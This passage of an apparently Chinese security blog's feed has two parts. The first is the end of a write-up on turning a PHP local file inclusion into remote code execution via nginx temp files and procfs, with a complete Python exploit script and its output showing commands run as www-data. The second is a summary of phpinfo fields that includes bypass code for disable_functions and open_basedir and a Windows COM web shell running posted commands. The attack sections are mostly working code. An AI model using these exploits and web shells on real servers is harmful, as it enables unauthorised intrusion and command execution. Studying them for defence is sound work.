access)</span><br>&#123;<br>    <span class="hljs-type">ngx_fd_t</span>  fd;<br><br>    fd = open((<span class="hljs-type">const</span> <span class="hljs-type">char</span> *) name, O_CREAT|O_EXCL|O_RDWR,<br>              access ? access : <span class="hljs-number">0600</span>);<br><br>    <span class="hljs-keyword">if</span> (fd != <span class="hljs-number">-1</span> &amp;&amp; !persistent) &#123;<br>        (<span class="hljs-type">void</span>) unlink((<span class="hljs-type">const</span> <span class="hljs-type">char</span> *) name);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> fd;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到临时文件在nginx打开后立即被删除。但是procfs 仍可用于通过竞赛获得对已删除文件的引用</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs tap">...<br>/proc/34/fd:<br>total 0<br>lrwx------<span class="hljs-number"> 1 </span>www-data www-data<span class="hljs-number"> 64 </span>Dec<span class="hljs-number"> 25 </span>23:56<span class="hljs-number"> 0 </span>-&gt; /dev/pts/0<br>lrwx------<span class="hljs-number"> 1 </span>www-data www-data<span class="hljs-number"> 64 </span>Dec<span class="hljs-number"> 25 </span>23:56<span class="hljs-number"> 1 </span>-&gt; /dev/pts/0<br>lrwx------<span class="hljs-number"> 1 </span>www-data www-data<span class="hljs-number"> 64 </span>Dec<span class="hljs-number"> 25 </span>23:49<span class="hljs-number"> 10 </span>-&gt; anon_inode:[eventfd]<br>lrwx------<span class="hljs-number"> 1 </span>www-data www-data<span class="hljs-number"> 64 </span>Dec<span class="hljs-number"> 25 </span>23:49<span class="hljs-number"> 11 </span>-&gt; socket:[27587]<br>lrwx------<span class="hljs-number"> 1 </span>www-data www-data<span class="hljs-number"> 64 </span>Dec<span class="hljs-number"> 25 </span>23:49<span class="hljs-number"> 12 </span>-&gt; socket:[27589]<br>lrwx------<span class="hljs-number"> 1 </span>www-data www-data<span class="hljs-number"> 64 </span>Dec<span class="hljs-number"> 25 </span>23:56<span class="hljs-number"> 13 </span>-&gt; socket:[44926]<br>lrwx------<span class="hljs-number"> 1 </span>www-data www-data<span class="hljs-number"> 64 </span>Dec<span class="hljs-number"> 25 </span>23:57<span class="hljs-number"> 14 </span>-&gt; socket:[44927]<br>lrwx------<span class="hljs-number"> 1 </span>www-data www-data<span class="hljs-number"> 64 </span>Dec<span class="hljs-number"> 25 </span>23:58<span class="hljs-number"> 15 </span>-&gt; /var/lib/nginx/body/0000001368 (deleted)<br>...<br></code></pre></td></tr></table></figure><p>注意：这个例子中不能直接包含&#x2F;proc&#x2F;34&#x2F;fd&#x2F;15，因为PHP的包含函数会解析文件系统中不存在的&#x2F;var&#x2F;lib&#x2F;nginx&#x2F;body&#x2F;0000001368 (deleted)的路径。但这个限制可以被一些间接操作绕过，比如<code>/proc/self/fd/34/../../../34/fd/15</code>。最终将执行那个已经被删除的文件<code>/var/lib/nginx/body/0000001368 file</code>中的内容。</p><h1 id="0x02-完整exp"><a href="#0x02-完整exp" class="headerlink" title="0x02 完整exp"></a>0x02 完整exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">import</span> sys, threading, requests<br><br><span class="hljs-comment"># exploit PHP local file inclusion (LFI) via nginx&#x27;s client body buffering assistance</span><br><span class="hljs-comment"># see https://bierbaumer.net/security/php-lfi-with-nginx-assistance/ for details</span><br><br>URL = <span class="hljs-string">f&#x27;http://<span class="hljs-subst">&#123;sys.argv[<span class="hljs-number">1</span>]&#125;</span>:<span class="hljs-subst">&#123;sys.argv[<span class="hljs-number">2</span>]&#125;</span>/&#x27;</span><br><br><span class="hljs-comment"># find nginx worker processes </span><br>r  = requests.get(URL, params=&#123;<br>    <span class="hljs-string">&#x27;file&#x27;</span>: <span class="hljs-string">&#x27;/proc/cpuinfo&#x27;</span><br>&#125;)<br>cpus = r.text.count(<span class="hljs-string">&#x27;processor&#x27;</span>)<br><br>r  = requests.get(URL, params=&#123;<br>    <span class="hljs-string">&#x27;file&#x27;</span>: <span class="hljs-string">&#x27;/proc/sys/kernel/pid_max&#x27;</span><br>&#125;)<br>pid_max = <span class="hljs-built_in">int</span>(r.text)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;[*] cpus: <span class="hljs-subst">&#123;cpus&#125;</span>; pid_max: <span class="hljs-subst">&#123;pid_max&#125;</span>&#x27;</span>)<br><br>nginx_workers = []<br><span class="hljs-keyword">for</span> pid <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(pid_max):<br>    r  = requests.get(URL, params=&#123;<br>        <span class="hljs-string">&#x27;file&#x27;</span>: <span class="hljs-string">f&#x27;/proc/<span class="hljs-subst">&#123;pid&#125;</span>/cmdline&#x27;</span><br>    &#125;)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;nginx: worker process&#x27;</span> <span class="hljs-keyword">in</span> r.content:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;[*] nginx worker found: <span class="hljs-subst">&#123;pid&#125;</span>&#x27;</span>)<br><br>        nginx_workers.append(pid)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(nginx_workers) &gt;= cpus:<br>            <span class="hljs-keyword">break</span><br><br>done = <span class="hljs-literal">False</span><br><br><span class="hljs-comment"># upload a big client body to force nginx to create a /var/lib/nginx/body/$X</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">uploader</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] starting uploader&#x27;</span>)<br>    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> done:<br>        requests.get(URL, data=<span class="hljs-string">&#x27;&lt;?php system($_GET[&quot;c&quot;]); /*&#x27;</span> + <span class="hljs-number">16</span>*<span class="hljs-number">1024</span>*<span class="hljs-string">&#x27;A&#x27;</span>)<br><br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>    t = threading.Thread(target=uploader)<br>    t.start()<br><br><span class="hljs-comment"># brute force nginx&#x27;s fds to include body files via procfs</span><br><span class="hljs-comment"># use ../../ to bypass include&#x27;s readlink / stat problems with resolving fds to `/var/lib/nginx/body/0000001150 (deleted)`</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bruter</span>(<span class="hljs-params">pid</span>):<br>    <span class="hljs-keyword">global</span> done<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> done:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;[+] brute loop restarted: <span class="hljs-subst">&#123;pid&#125;</span>&#x27;</span>)<br>        <span class="hljs-keyword">for</span> fd <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>, <span class="hljs-number">32</span>):<br>            f = <span class="hljs-string">f&#x27;/proc/self/fd/<span class="hljs-subst">&#123;pid&#125;</span>/../../../<span class="hljs-subst">&#123;pid&#125;</span>/fd/<span class="hljs-subst">&#123;fd&#125;</span>&#x27;</span><br>            r  = requests.get(URL, params=&#123;<br>                <span class="hljs-string">&#x27;file&#x27;</span>: f,<br>                <span class="hljs-string">&#x27;c&#x27;</span>: <span class="hljs-string">f&#x27;id&#x27;</span><br>            &#125;)<br>            <span class="hljs-keyword">if</span> r.text:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;[!] <span class="hljs-subst">&#123;f&#125;</span>: <span class="hljs-subst">&#123;r.text&#125;</span>&#x27;</span>)<br>                done = <span class="hljs-literal">True</span><br>                exit()<br><br><span class="hljs-keyword">for</span> pid <span class="hljs-keyword">in</span> nginx_workers:<br>    a = threading.Thread(target=bruter, args=(pid, ))<br>    a.start()<br></code></pre></td></tr></table></figure><p>输出：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">$ ./pwn.py <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> <span class="hljs-number">1337</span><br><span class="hljs-string">[*]</span> cpus: <span class="hljs-number">2</span>; pid_max: <span class="hljs-number">32768</span><br><span class="hljs-string">[*]</span> nginx worker found: <span class="hljs-number">33</span><br><span class="hljs-string">[*]</span> nginx worker found: <span class="hljs-number">34</span><br><span class="hljs-string">[+]</span> starting uploader<br><span class="hljs-string">[+]</span> starting uploader<br><span class="hljs-string">[+]</span> starting uploader<br><span class="hljs-string">[+]</span> starting uploader<br><span class="hljs-string">[+]</span> starting uploader<br><span class="hljs-string">[+]</span> starting uploader<br><span class="hljs-string">[+]</span> starting uploader<br><span class="hljs-string">[+]</span> starting uploader<br><span class="hljs-string">[+]</span> starting uploader<br><span class="hljs-string">[+]</span> starting uploader<br><span class="hljs-string">[+]</span> starting uploader<br><span class="hljs-string">[+]</span> starting uploader<br><span class="hljs-string">[+]</span> starting uploader<br><span class="hljs-string">[+]</span> starting uploader<br><span class="hljs-string">[+]</span> starting uploader<br><span class="hljs-string">[+]</span> starting uploader<br><span class="hljs-string">[+]</span> brute loop restarted: <span class="hljs-number">33</span><br><span class="hljs-string">[+]</span> brute loop restarted: <span class="hljs-number">34</span><br><span class="hljs-string">[!]</span> /proc/self/fd/<span class="hljs-number">34</span>/../../../<span class="hljs-number">34</span>/fd/<span class="hljs-number">9</span>: uid=<span class="hljs-number">33</span>(www-data) gid=<span class="hljs-number">33</span>(www-data) groups=<span class="hljs-number">33</span>(www-data)<br></code></pre></td></tr></table></figure><p>备注：</p><ul><li>includer’s revenge还包含了一个LFI漏洞。通过fastcgi_buffering更容易利用，因为临时文件可以通过在http:&#x2F;&#x2F;资源上调用readfile保持打开状态。</li><li>counter 还添加了system()以便<code>/proc/$PID/cmdline</code>可用于通过 base64 包装器包含本地文件。</li></ul>]]></content>
    
    
    <categories>
      
      <category>技术</category>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>文件包含</tag>
      
      <tag>RCE</tag>
      
      <tag>PHP</tag>
      
      <tag>nginx</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>phpinfo信息利用总结</title>
    <link href="/2022/05/17/phpinfo%E4%BF%A1%E6%81%AF%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/"/>
    <url>/2022/05/17/phpinfo%E4%BF%A1%E6%81%AF%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p>本文抄的，就当总结的知识库</p><h2 id="system"><a href="#system" class="headerlink" title="system"></a>system</h2><p>获取具体版本，可以用来提权</p><h2 id="extension-dir"><a href="#extension-dir" class="headerlink" title="extension_dir"></a>extension_dir</h2><p>php扩展的路径</p><h2 id="http-x-real-ip"><a href="#http-x-real-ip" class="headerlink" title="http_x_real_ip"></a>http_x_real_ip</h2><p>直接获取真实ip，无视代理、cdn。顺便说下<code>HTTP_X_FORWARDED_FOR</code>的区别，<code>HTTP_X_FORWARDED_FOR</code>会记录代理过程且可伪造</p><h2 id="DOCUMENT-ROOT"><a href="#DOCUMENT-ROOT" class="headerlink" title="DOCUMENT_ROOT"></a>DOCUMENT_ROOT</h2><p>web根目录</p><h2 id="FILES-‘x’"><a href="#FILES-‘x’" class="headerlink" title="_FILES[‘x’]"></a>_FILES[‘x’]</h2><p>临时文件路径， LFI+phpinfo -&gt; RCE</p><h2 id="allow-url-include"><a href="#allow-url-include" class="headerlink" title="allow_url_include"></a>allow_url_include</h2><p>远程文件包含，但是一般不会开启</p><h2 id="asp-tags"><a href="#asp-tags" class="headerlink" title="asp_tags"></a>asp_tags</h2><p>php标签有4种形式，如果这个选项不开启的话(一般默认不开启)，使用asp的标签是不会解析的。<br>这里math1as师傅写了一篇<code>user.ini</code>+<code>asp_tags</code>绕过webshell检测的文章<a href="https://math1as.com/2016/05/15/a-way-to-bypass-php-tags-check/">a way to bypass php tags check</a><br>实际就是通过向其中添加<code>php_value asp_tags On</code>并上传<code>.htaccess</code>和<code>.user.ini</code>来bypass。<br>原理是：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">asp_tags的属性是这样的<br>PHP_INI_PERDIR：指令可以在php.ini、httpd.conf或.htaccess文件中修改<br></code></pre></td></tr></table></figure><p>注意： 在PHP 7已经完全移除了这种标签。</p><h2 id="Short-open-tag"><a href="#Short-open-tag" class="headerlink" title="Short_open_tag"></a>Short_open_tag</h2><p>还是标签的问题，允许<??>这种形式，并且&lt;?&#x3D;等价于&lt;? echo</p><h2 id="disable-functions和disable-classes"><a href="#disable-functions和disable-classes" class="headerlink" title="disable_functions和disable_classes"></a>disable_functions和disable_classes</h2><p>禁用函数列表：</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mel">(dl)<br><span class="hljs-keyword">exec</span><br><span class="hljs-keyword">system</span><br>passthru<br><span class="hljs-keyword">popen</span><br>proc_open<br>pcntl_exec<br>shell_exec<br></code></pre></td></tr></table></figure><h3 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h3><ol><li>记得Seay代码审计里说过<code>dl()</code>函数(需要enable_dl开启)</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//PHP5调用方法</span><br><span class="hljs-title function_ invoke__">dl</span>(<span class="hljs-string">&#x27;../../../../../home/apache/htdocs/php5.so&#x27;</span>);<br><span class="hljs-title function_ invoke__">spiderbiguan</span>(<span class="hljs-string">&#x27;uname -a&#x27;</span>);<span class="hljs-comment">//调用函数</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><ol start="2"><li>编译php时如果加了-–enable-pcntl选项，就可以使用pcntl_exec()来执行命令。PHP&gt;4.2.0</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">pcntl_exec</span>(“/bin/bash”, <span class="hljs-keyword">array</span>(“/tmp/b4dboy.sh”));<span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">#/tmp/b4dboy.sh</span><br><span class="hljs-comment">#!/bin/bash</span><br>ls -l /<br></code></pre></td></tr></table></figure><ol start="3"><li>利用ImageMagick漏洞绕过disable_function(应该是要组件与扩展都有具体没测试)</li></ol><p>​<a href="https://www.waitalone.cn/imagemagic-bypass-disable_function.html">https://www.waitalone.cn/imagemagic-bypass-disable_function.html</a></p><ol start="4"><li><p>利用环境变量LD_PRELOAD来绕过</p><p><a href="http://www.vuln.cn/6784%E7%9A%84%E7%A1%AE%E6%98%AF%E4%B8%80%E7%A7%8D%E5%A5%BD%E6%96%B9%E6%B3%95%EF%BC%8C%E5%88%A9%E7%94%A8%E8%B5%B7%E6%9D%A5%E4%B9%9F%E6%B2%A1%E6%9C%89%E9%82%A3%E4%B9%88%E7%B9%81%E7%90%90%E3%80%82">http://www.vuln.cn/6784的确是一种好方法，利用起来也没有那么繁琐。</a></p></li><li><p>win系统组件</p></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$command</span>=<span class="hljs-variable">$_POST</span>[a];<br><span class="hljs-variable">$wsh</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">COM</span>(<span class="hljs-string">&#x27;WScript.shell&#x27;</span>); <span class="hljs-comment">// 生成一个COM对象</span><br><span class="hljs-variable">$exec</span> = <span class="hljs-variable">$wsh</span>-&gt;<span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&#x27;cmd.exe /c &#x27;</span>.<span class="hljs-variable">$command</span>);  <span class="hljs-comment">//调用对象方法来执行命令</span><br><span class="hljs-variable">$stdout</span> = <span class="hljs-variable">$exec</span>-&gt;<span class="hljs-title function_ invoke__">StdOut</span>();<br><span class="hljs-variable">$stroutput</span> = <span class="hljs-variable">$stdout</span>-&gt;<span class="hljs-title function_ invoke__">ReadAll</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$stroutput</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="magic-quotes-gpc"><a href="#magic-quotes-gpc" class="headerlink" title="magic_quotes_gpc"></a>magic_quotes_gpc</h2><p>魔术引号，它是用来实现addslshes()和stripslashes()这两个功能的，对SQL注入进行防御。用了<code>addslshes()</code>除非是有编码问题要不然是不存在注入的。</p><h2 id="open-basedir"><a href="#open-basedir" class="headerlink" title="open_basedir"></a>open_basedir</h2><p>将用户可操作的文件限制在某目录下</p><h3 id="绕过方式-1"><a href="#绕过方式-1" class="headerlink" title="绕过方式"></a>绕过方式</h3><p><a href="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html">https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html</a></p><ol><li>利用DirectoryIterator + Glob 直接列举目录(linux)</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">printf</span>(<span class="hljs-string">&#x27;&lt;b&gt;open_basedir : %s &lt;/b&gt;&lt;br /&gt;&#x27;</span>, <span class="hljs-title function_ invoke__">ini_get</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>));<br><span class="hljs-variable">$file_list</span> = <span class="hljs-keyword">array</span>();<br><span class="hljs-comment">// normal files</span><br><span class="hljs-variable">$it</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob:///*&quot;</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$it</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>) &#123;<br>    <span class="hljs-variable">$file_list</span>[] = <span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>();<br>&#125;<br><span class="hljs-comment">// special files (starting with a dot(.))</span><br><span class="hljs-variable">$it</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob:///.*&quot;</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$it</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>) &#123;<br>    <span class="hljs-variable">$file_list</span>[] = <span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>();<br>&#125;<br><span class="hljs-title function_ invoke__">sort</span>(<span class="hljs-variable">$file_list</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$file_list</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">&#123;$f&#125;</span>&lt;br/&gt;&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><ol start="2"><li>realpath列举目录</li></ol><p>利用realpath对传入路径的回显不同加上通配符进行列举。本地环境linux就没有进行测试。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>, <span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-keyword">__FILE__</span>));<br><span class="hljs-title function_ invoke__">printf</span>(<span class="hljs-string">&quot;&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;&quot;</span>, <span class="hljs-title function_ invoke__">ini_get</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>));<br><span class="hljs-title function_ invoke__">set_error_handler</span>(<span class="hljs-string">&#x27;isexists&#x27;</span>);<br><span class="hljs-variable">$dir</span> = <span class="hljs-string">&#x27;d:/test/&#x27;</span>;<br><span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$chars</span> = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789_&#x27;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$chars</span>); <span class="hljs-variable">$i</span>++) &#123; <br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$dir</span> . <span class="hljs-variable">$chars</span>[<span class="hljs-variable">$i</span>] . <span class="hljs-string">&#x27;&lt;&gt;&lt;&#x27;</span>;<br>    <span class="hljs-title function_ invoke__">realpath</span>(<span class="hljs-variable">$file</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isexists</span>(<span class="hljs-params"><span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$regexp</span> = <span class="hljs-string">&#x27;/File\((.*)\) is not within/&#x27;</span>;<br>    <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$regexp</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-variable">$matches</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$matches</span>[<span class="hljs-number">1</span>])) &#123;<br>        <span class="hljs-title function_ invoke__">printf</span>(<span class="hljs-string">&quot;%s &lt;br/&gt;&quot;</span>, <span class="hljs-variable">$matches</span>[<span class="hljs-number">1</span>]);<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>首先设置open_basedir为当前目录，并枚举d:&#x2F;test&#x2F;目录下的所有文件。将错误处理交给isexists函数，在isexists函数中匹配出目录名称，并打印出来。</p><ol start="3"><li>SplFileInfo::getRealPath列举目录</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>, <span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-keyword">__FILE__</span>));<br><span class="hljs-title function_ invoke__">printf</span>(<span class="hljs-string">&quot;&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;&quot;</span>, <span class="hljs-title function_ invoke__">ini_get</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>));<br><span class="hljs-variable">$basedir</span> = <span class="hljs-string">&#x27;D:/test/&#x27;</span>;<br><span class="hljs-variable">$arr</span> = <span class="hljs-keyword">array</span>();<br><span class="hljs-variable">$chars</span> = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789&#x27;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$chars</span>); <span class="hljs-variable">$i</span>++) &#123; <br>    <span class="hljs-variable">$info</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileInfo</span>(<span class="hljs-variable">$basedir</span> . <span class="hljs-variable">$chars</span>[<span class="hljs-variable">$i</span>] . <span class="hljs-string">&#x27;&lt;&gt;&lt;&#x27;</span>);<br>    <span class="hljs-variable">$re</span> = <span class="hljs-variable">$info</span>-&gt;<span class="hljs-title function_ invoke__">getRealPath</span>();<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$re</span>) &#123;<br>        <span class="hljs-title function_ invoke__">dump</span>(<span class="hljs-variable">$re</span>);<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dump</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>)</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$s</span> . <span class="hljs-string">&#x27;&lt;br/&gt;&#x27;</span>;<br>    <span class="hljs-title function_ invoke__">ob_flush</span>();<br>    <span class="hljs-title function_ invoke__">flush</span>();<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>还有GD库imageftbbox&#x2F;imagefttext列举目录bindtextdomain暴力猜解目录，基本也都是要暴力破解，效率比较低。</p><p>参考：</p><p><a href="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html">PHP绕过open_basedir列目录的研究</a><br><a href="https://www.leavesongs.com/bypass-open-basedir-readfile.html">php5全版本绕过open_basedir读文件脚本</a><br><a href="https://blog.csdn.net/niexinming/article/details/53146095">绕过open_basedir读文件脚本</a></p><h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><h3 id="imagick"><a href="#imagick" class="headerlink" title="imagick"></a>imagick</h3><p>漏洞影响ImageMagick 6.9.3-10之前的版本，包括ubuntu源中安装的ImageMagick<br>详情参考：<br><a href="http://blog.topsec.com.cn/imagemagick-%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8%e6%96%b9%e5%bc%8f%e5%8f%8a%e5%88%86%e6%9e%90/">ImageMagick 漏洞利用方式及分析</a><br><a href="https://blog.csdn.net/yaofeino1/article/details/77113473">ImageMagick远程代码执行漏洞分析</a></p><p><a href="https://www.jianshu.com/p/502e39c122e6">远程执行</a></p><h3 id="libxml"><a href="#libxml" class="headerlink" title="libxml"></a>libxml</h3><p>libxml 